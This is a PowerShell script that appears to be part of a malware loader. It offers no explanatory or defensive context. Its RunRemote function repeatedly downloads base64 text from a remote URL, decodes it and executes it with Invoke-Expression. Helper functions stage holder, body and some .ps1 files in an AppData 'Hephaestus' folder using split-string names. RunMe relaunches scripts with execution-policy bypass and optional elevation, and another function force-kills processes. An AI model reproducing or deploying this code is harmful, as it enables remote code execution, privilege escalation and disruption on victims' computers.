
function RunRemote {
    param (
        [string]$baseUrl,
        [string]$part,
        [bool]$waitForFinish
    )
    $url = "$baseUrl/$part.txt"
    $timeout = [datetime]::UtcNow.AddMinutes(5)
    $delay = 5
    Start-Sleep -Seconds $delay
    while ([datetime]::UtcNow -lt $timeout) {
        try {
            $response = Invoke-WebRequest -Uri $url -UseBasicParsing -Method Get
            if ($response.StatusCode -eq 200) {
                $scripData = $response.Content
                $scripData = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($scripData))
                $generalJob = Start-Job -ScriptBlock { Invoke-Expression $using:scripData }
                if ($waitForFinish) {
                    Wait-Job -Job $generalJob -Timeout 300 | Out-Null
                    if ($generalJob.State -eq 'Completed') {
                        $result = Receive-Job -Job $generalJob
                        Remove-Job -Job $generalJob
                        return $result
                    } else {
                        writedbg "Job did not complete within the timeout period."
                        Remove-Job -Job $generalJob
                        return
                    }
                } else {
                    return
                }
            }
        } catch {
            writedbg "Failed to runremote ($url): $_"
        }
        Start-Sleep -Seconds $delay
    }
    writedbg "Failed to run remote ($url) within the allotted time."
}

function IsDebug {
    $debugFile = "C:\debug.txt"
    
    try {
        # Check if the file exists
        if (Test-Path $debugFile -PathType Leaf) {
            return $true
        } else {
            return $false
        }
    } catch {
        # Catch any errors that occur during the Test-Path operation
        return $false
    }
}


$globalDebug = IsDebug;

function writedbg {
    param (
        [string]$msg,   [string]$msg2=""
    )
        if ($globalDebug){
            Write-Host $msg + $msg2
        }
}

function Utf8NoBom {
    param (
        [string]$data,
        [string]$file
    )

    # Create a StreamWriter to write without BOM
    $streamWriter = [System.IO.StreamWriter]::new($file, $false, [System.Text.Encoding]::UTF8)
    $streamWriter.Write($data)
    $streamWriter.Close()

    # Forcefully overwrite the file to ensure no BOM is present
    # Read back the written file as byte array
    $writtenContent = [System.IO.File]::ReadAllBytes($file)

    # Check for BOM (UTF-8 BOM is 0xEF, 0xBB, 0xBF)
    if ($writtenContent.Length -ge 3 -and $writtenContent[0] -eq 0xEF -and $writtenContent[1] -eq 0xBB -and $writtenContent[2] -eq 0xBF) {
        # Remove the BOM bytes
        $writtenContent = $writtenContent[3..($writtenContent.Length - 1)]
    }

    # Write back the content without BOM
    [System.IO.File]::WriteAllBytes($file, $writtenContent)
}

function GetUtfNoBom {
    param (
        [string]$file
    )

    # Read the file as a byte array
    $contentBytes = [System.IO.File]::ReadAllBytes($file)

    # Check for BOM (UTF-8 BOM is 0xEF, 0xBB, 0xBF)
    if ($contentBytes.Length -ge 3 -and $contentBytes[0] -eq 0xEF -and $contentBytes[1] -eq 0xBB -and $contentBytes[2] -eq 0xBF) {
        # Remove the BOM
        $contentBytes = $contentBytes[3..($contentBytes.Length - 1)]
    }

    # Convert the byte array back to a UTF-8 string
    $contentWithoutBom = [System.Text.Encoding]::UTF8.GetString($contentBytes)

    return $contentWithoutBom
}


function Get-HephaestusFolder {
    $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
    $hephaestusFolder = Join-Path $appDataPath 'Hephaestus'
    return $hephaestusFolder
}

function Get-HolderPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = 'holder' + '.' + 'ps1'
    $holderPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $holderPath
}

function Get-SomePath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = 'some' + '.' + 'ps1'
    $holderPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $holderPath
}

function Get-BodyPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = 'body' + '.' + 'ps1'
    $bodyPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $bodyPath
}



function ExtractEmbedding {
    param (
        [string]$inContent,
        [string]$outFile
    )
    $decodedBytes = [Convert]::FromBase64String($inContent)
    [System.IO.File]::WriteAllBytes($outFile, $decodedBytes)
}

function Test-Arg{ param ([string]$arg)
    $globalArgs = $global:args -join ' '
    if ($globalArgs -like "*$arg*") {
        return $true
    }
    return $false
} 

function Test-Autostart 
{
    return Test-Arg -arg "autostart"
}


function RunMe {
    param (
        [string]$script, 
        [string]$arg,
        [bool]$uac
    )

    try 
    {
        $scriptPath = $script
        
        $localArguments = @("-ExecutionPolicy Bypass")
        
        $globalArgs = $global:args
        foreach ($globalArg in $globalArgs) {
            $localArguments += "-Argument `"$globalArg`""
        }

        if (-not [string]::IsNullOrEmpty($arg)) {
            $localArguments += "-$arg"
        }

        $localArgumentList = @("-File", $scriptPath) + $localArguments
        
        if ($uac -eq $true) {
            Start-Process powershell.exe -ArgumentList $localArgumentList -Verb RunAs
        } else {
            Start-Process powershell.exe -ArgumentList $localArgumentList
        }
    }
    catch {
          writedbg "RunMe: $_"
    }

}


function Get-EnvPaths {
    $a = Get-LocalAppDataPath
    $b =  Get-AppDataPath
    return @($a , $b)
}

function Get-TempFile {
    $tempPath = [System.IO.Path]::GetTempPath()
    $tempFile = [System.IO.Path]::GetTempFileName()
    return $tempFile
}

function Get-LocalAppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
}

function Get-AppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
}

function Get-ProfilePath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
}

function Close-Processes {
    param (
        [string[]]$processes
    )

    foreach ($process in $Processes) {
        $command = "taskkill.exe /im $process /f"
        Invoke-Expression $command
    }
}